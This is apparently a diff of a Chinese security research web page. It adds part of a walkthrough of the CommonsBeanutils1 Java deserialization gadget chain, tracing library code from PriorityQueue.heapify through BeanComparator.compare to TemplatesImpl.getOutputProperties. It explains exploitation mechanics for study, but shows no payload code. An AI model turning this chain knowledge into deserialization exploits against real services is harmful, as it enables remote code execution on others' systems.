-<a class="nav nav-next" href=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" style=margin-right:0><i class="fa fa-chevron-right"></i></a></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js?1706695144></script><script src=/js/perfect-scrollbar.min.js?1706695144></script><script src=/js/perfect-scrollbar.jquery.min.js?1706695144></script><script src=/js/jquery.sticky.js?1706695144></script><script src=/js/featherlight.min.js?1706695144></script><script src=/js/highlight.pack.js?1706695144></script><script>hljs.initHighlightingOnLoad()</script><script src=/js/modernizr.custom-3.6.0.js?1706695144></script><script src=/js/learn.js?1706695144></script><script src=/js/hugo-learn.js?1706695144></script><script src=/mermaid/mermaid.js?1706695144></script><script>mermaid.initialize({startOnLoad:!0})</script><script>(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-105947713-1","auto"),ga("send","pageview")</script></body></html>
+<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/2.png></p>
+<p>在readObject断点，可以看到尝试反序列化<code>comparator</code>，这里是<code>BeanComparator</code>，并递归反序列化<code>TemplatesImpl</code>
+<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/3.png></p>
+<p>而后readObject会调用heapify方法，跟进调用最后调用到comparator.compare</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>heapify</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>size <span style=color:#f92672>&gt;&gt;&gt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>-</span> 1<span style=color:#f92672>;</span> i <span style=color:#f92672>&gt;=</span> 0<span style=color:#f92672>;</span> i<span style=color:#f92672>--)</span>
+            siftDown<span style=color:#f92672>(</span>i<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> queue<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDown</span><span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> k<span style=color:#f92672>,</span> E x<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>comparator <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span>
+            siftDownUsingComparator<span style=color:#f92672>(</span>k<span style=color:#f92672>,</span> x<span style=color:#f92672>);</span>
+        <span style=color:#66d9ef>else</span>
+            siftDownComparable<span style=color:#f92672>(</span>k<span style=color:#f92672>,</span> x<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>siftDownUsingComparator</span><span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> k<span style=color:#f92672>,</span> E x<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>int</span> half <span style=color:#f92672>=</span> size <span style=color:#f92672>&gt;&gt;&gt;</span> 1<span style=color:#f92672>;</span>
+        <span style=color:#66d9ef>while</span> <span style=color:#f92672>(</span>k <span style=color:#f92672>&lt;</span> half<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>int</span> child <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>k <span style=color:#f92672>&lt;&lt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>+</span> 1<span style=color:#f92672>;</span>
+            Object c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child<span style=color:#f92672>];</span>
+            <span style=color:#66d9ef>int</span> right <span style=color:#f92672>=</span> child <span style=color:#f92672>+</span> 1<span style=color:#f92672>;</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>right <span style=color:#f92672>&lt;</span> size <span style=color:#f92672>&amp;&amp;</span>
+                comparator<span style=color:#f92672>.</span><span style=color:#a6e22e>compare</span><span style=color:#f92672>((</span>E<span style=color:#f92672>)</span> c<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> queue<span style=color:#f92672>[</span>right<span style=color:#f92672>])</span> <span style=color:#f92672>&gt;</span> 0<span style=color:#f92672>)</span>
+                c <span style=color:#f92672>=</span> queue<span style=color:#f92672>[</span>child <span style=color:#f92672>=</span> right<span style=color:#f92672>];</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>comparator<span style=color:#f92672>.</span><span style=color:#a6e22e>compare</span><span style=color:#f92672>(</span>x<span style=color:#f92672>,</span> <span style=color:#f92672>(</span>E<span style=color:#f92672>)</span> c<span style=color:#f92672>)</span> <span style=color:#f92672>&lt;=</span> 0<span style=color:#f92672>)</span>
+                <span style=color:#66d9ef>break</span><span style=color:#f92672>;</span>
+            queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> c<span style=color:#f92672>;</span>
+            k <span style=color:#f92672>=</span> child<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+        queue<span style=color:#f92672>[</span>k<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> x<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>BeanComparator实现了Comparator接口，compare方法代码如下，其会调用getProperty方法，前面在ysoserial中property被设置为outputProperities</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>compare</span><span style=color:#f92672>(</span>T o1<span style=color:#f92672>,</span> T o2<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>property</span> <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internalCompare</span><span style=color:#f92672>(</span>o1<span style=color:#f92672>,</span> o2<span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+                Object value1 <span style=color:#f92672>=</span> PropertyUtils<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span>o1<span style=color:#f92672>,</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>property</span><span style=color:#f92672>);</span>
+                Object value2 <span style=color:#f92672>=</span> PropertyUtils<span style=color:#f92672>.</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span>o2<span style=color:#f92672>,</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>property</span><span style=color:#f92672>);</span>
+                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>internalCompare</span><span style=color:#f92672>(</span>value1<span style=color:#f92672>,</span> value2<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IllegalAccessException var5<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;IllegalAccessException: &#34;</span> <span style=color:#f92672>+</span> var5<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException var6<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;InvocationTargetException: &#34;</span> <span style=color:#f92672>+</span> var6<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>NoSuchMethodException var7<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;NoSuchMethodException: &#34;</span> <span style=color:#f92672>+</span> var7<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>
+<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/4.png></p>
+<p>跟进getProperty方法内，其中bean为<code>TemplatesImpl</code>对象，会进入<code>bean = this.getSimpleProperty(bean, name);</code></p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> Object <span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span>Object bean<span style=color:#f92672>,</span> String name<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IllegalAccessException<span style=color:#f92672>,</span> InvocationTargetException<span style=color:#f92672>,</span> NoSuchMethodException <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> PropertyUtilsBean<span style=color:#f92672>.</span><span style=color:#a6e22e>getInstance</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getProperty</span><span style=color:#f92672>(</span>Object bean<span style=color:#f92672>,</span> String name<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IllegalAccessException<span style=color:#f92672>,</span> InvocationTargetException<span style=color:#f92672>,</span> NoSuchMethodException <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getNestedProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getNestedProperty</span><span style=color:#f92672>(</span>Object bean<span style=color:#f92672>,</span> String name<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IllegalAccessException<span style=color:#f92672>,</span> InvocationTargetException<span style=color:#f92672>,</span> NoSuchMethodException <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>bean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;No bean specified&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;No name specified for bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>while</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>hasNested</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                String next <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
+                Object nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>bean <span style=color:#66d9ef>instanceof</span> Map<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getPropertyOfMapBean</span><span style=color:#f92672>((</span>Map<span style=color:#f92672>)</span>bean<span style=color:#f92672>,</span> next<span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isMapped</span><span style=color:#f92672>(</span>next<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getMappedProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> next<span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isIndexed</span><span style=color:#f92672>(</span>next<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getIndexedProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> next<span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                    nestedBean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getSimpleProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> next<span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span>
+
+                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>nestedBean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NestedNullException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Null property value for &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span>
+
+                bean <span style=color:#f92672>=</span> nestedBean<span style=color:#f92672>;</span>
+                name <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>remove</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>bean <span style=color:#66d9ef>instanceof</span> Map<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getPropertyOfMapBean</span><span style=color:#f92672>((</span>Map<span style=color:#f92672>)</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isMapped</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getMappedProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isIndexed</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getIndexedProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                bean <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getSimpleProperty</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+
+            <span style=color:#66d9ef>return</span> bean<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>在<code>getSimpleProperty</code>方法内会通过反射获取到<code>TemplatesImpl</code>对象<code>property</code>对应的的getter方法并调用，在java规范中outputProperities对应的getter方法名应该为getOutputProperities</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>getSimpleProperty</span><span style=color:#f92672>(</span>Object bean<span style=color:#f92672>,</span> String name<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> IllegalAccessException<span style=color:#f92672>,</span> InvocationTargetException<span style=color:#f92672>,</span> NoSuchMethodException <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>bean <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;No bean specified&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;No name specified for bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>hasNested</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Nested property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isIndexed</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Indexed property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>resolver</span><span style=color:#f92672>.</span><span style=color:#a6e22e>isMapped</span><span style=color:#f92672>(</span>name<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Mapped property names are not allowed: Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on bean class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>bean <span style=color:#66d9ef>instanceof</span> DynaBean<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            DynaProperty descriptor <span style=color:#f92672>=</span> <span style=color:#f92672>((</span>DynaBean<span style=color:#f92672>)</span>bean<span style=color:#f92672>).</span><span style=color:#a6e22e>getDynaClass</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getDynaProperty</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>descriptor <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Unknown property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on dynaclass &#39;&#34;</span> <span style=color:#f92672>+</span> <span style=color:#f92672>((</span>DynaBean<span style=color:#f92672>)</span>bean<span style=color:#f92672>).</span><span style=color:#a6e22e>getDynaClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>return</span> <span style=color:#f92672>((</span>DynaBean<span style=color:#f92672>)</span>bean<span style=color:#f92672>).</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>name<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            PropertyDescriptor descriptor <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getPropertyDescriptor</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>,</span> name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>descriptor <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Unknown property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; on class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                Method readMethod <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getReadMethod</span><span style=color:#f92672>(</span>bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>(),</span> descriptor<span style=color:#f92672>);</span>
+                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>readMethod <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                    <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> NoSuchMethodException<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Property &#39;&#34;</span> <span style=color:#f92672>+</span> name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39; has no getter method in class &#39;&#34;</span> <span style=color:#f92672>+</span> bean<span style=color:#f92672>.</span><span style=color:#a6e22e>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;&#39;&#34;</span><span style=color:#f92672>);</span>
+                <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                    Object value <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invokeMethod</span><span style=color:#f92672>(</span>readMethod<span style=color:#f92672>,</span> bean<span style=color:#f92672>,</span> EMPTY_OBJECT_ARRAY<span style=color:#f92672>);</span>
+                    <span style=color:#66d9ef>return</span> value<span style=color:#f92672>;</span>
+                <span style=color:#f92672>}</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>
+<img alt src=/images/research/web/java-deserialization/CommonsBeanutils1-chain.zh-cn.assets/5.png></p>
+<p><code>TemplatesImpl</code>类中<code>getOutputProperties</code>方法代码如下，会调用<code>newTransformer</code>方法</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Properties <span style=color:#a6e22e>getOutputProperties</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>return</span> newTransformer<span style=color:#f92672>().</span><span style=color:#a6e22e>getOutputProperties</span><span style=color:#f92672>();</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>TransformerConfigurationException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
